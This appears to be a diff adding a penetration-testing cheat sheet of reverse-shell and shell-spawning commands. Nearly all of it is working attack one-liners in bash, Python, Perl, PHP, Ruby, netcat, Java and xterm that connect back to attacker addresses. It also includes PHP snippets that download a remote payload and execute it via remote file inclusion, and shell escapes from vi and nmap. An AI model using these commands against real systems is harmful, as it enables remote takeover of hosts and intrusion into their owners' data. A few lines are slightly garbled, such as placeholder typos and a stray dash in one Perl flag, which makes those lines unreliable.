@@ -1,0 +1,95 @@
+## Reverse Shells
+
+**BASH**
+
+bash -i >& /dev/tcp/192.168.1.69/443 0>&1  
+
+**Python**
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+**PERL**
+
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+**PHP**
+
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Download shell and execute shell.php.
+
+<?php system("wget <attck system>/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
+
+wget - downloads the the main file on the target machine
+
+-O /tmp/shell.php - converts the text file into php (this is used to prevent activation of php payload on our server) and saves it inside /tmp folder
+
+;php /tmp/shell.php - runs the php file with our malicious payload inside
+
+**RUBY**
+
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+**Netcat**
+
+nc -e /bin/sh 10.0.0.1 1234
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+**Java**
+
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+**xterm**
+
+One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
+
+xterm -display 10.0.0.1:1
+
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+
+Xnest :1
+When Using RFI
+
+<?php $z=fopen(‘./shell.php’,’w’);fwrite($z,file_get_contents(‘http://<attack>/exploits/back.txt’));fclose($z); ?>
+
+###Shell Spawning
+**PYTHON**
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+echo os.system('/bin/bash')
+
+/bin/sh -i
+
+perl —e 'exec "/bin/sh";'
+
+**From within perl:**
+
+exec "/bin/sh";
+
+**From within ruby:**
+
+exec "/bin/sh"
+
+**From within lua:**
+
+os.execute('/bin/sh')
+
+**From within IRB**
+
+exec "/bin/sh"
+
+**From within v**
+
+:!bash
+
+**From within vi**
+
+:set shell=/bin/bash:shell
+
+**From within nmap**
+
+!sh
